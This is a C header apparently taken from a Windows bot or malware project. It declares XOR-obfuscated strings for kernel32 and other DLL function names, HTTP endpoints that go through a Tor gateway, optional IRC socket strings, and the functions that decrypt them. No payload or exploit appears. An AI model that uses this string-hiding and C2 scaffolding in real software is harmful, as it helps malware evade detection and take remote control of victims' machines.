#ifndef STRINGS_H_INCLUDED

struct string {
    const uint8_t len;
    const char* str;
#ifdef _STRINGS_BIN
    const char* name;
#endif
};

#ifdef _STRINGS_BIN
#define STRENT(s) { sizeof(s) - 1, s, #s }
#else
#define STRENT(s) { sizeof(s) - 1, s }
#endif

#ifdef _STRINGS_BIN
#define NULLENT(x) { 0, NULL, #x }
#else
#define NULLENT(x) { 0, NULL }
#endif


#include "xor_strings_gen.h"
enum stridx {
    XOR_STARTFUNCS = 0,
    /* kernel32.dll */
    XOR_KEY_FUNCS_ENUM,
    XOR_KEY_FUNCS_INFO_ENUM,
    XOR_KEY_FUNCS_KERNEL_ENUM,
#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
    XOR_KEY_FUNCS_DEBUG_ENUM,
#endif
    /* ------------------ */
    XOR_ENDFUNCS,
    /* non-kernel32.dll */
    XOR_KEY_FUNCS_OTHER_ENUM,
    /* ------------------ */
    XOR_ENDFUNCS_OTHER,
    XOR_KEY_HTTP_ENUM,
#ifdef _HTTP_LOCALHOST
    XOR_KEY_HTTP_LOCALHOST_ENUM,
#else
    XOR_KEY_HTTP_WEB2TOR_ENUM,
#endif
#ifdef _ENABLE_IRC
    XOR_SOCK_FUNCS_START,
    XOR_KEY_SOCK_FUNCS_ENUM,  /* Ws32.dll functions */
    XOR_SOCK_FUNCS_END,
    XOR_KEY_SOCK_STRS_ENUM,
#endif
    XOR_KEY_ROOT_ENUM,    /* all non-func strings */
#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
#ifdef _USE_PIPES
    XOR_KEY_DEBUG_ENUM,   /* additional debug-only strings */
#endif
#endif
    STR_MAX
};


#define CLEN(i)       crypt_len(i)
#define CBUF(i, name) char name[CLEN(i)+1]; name[CLEN(i)] = 0;
#define DBUF(i, name) CBUF(i, name); decrypt_string(i, &name[0])

uint8_t crypt_len(enum stridx i);

char* decrypt_string(enum stridx i, char* plainStrPtr);

int get_string_in_strings(char* strings, char delim, char** pDest, char** pEnd);

int get_string_in_strings_d(char* strings, char** pDest, char** pEnd);

int get_string_in_strings_i(char* strings, char delim, int idx, char** pDest, char** pEnd);

int get_string_in_strings_di(char* strings, int idx, char** pDest, char** pEnd);

void string_restore_delim(char* pEnd);

#endif
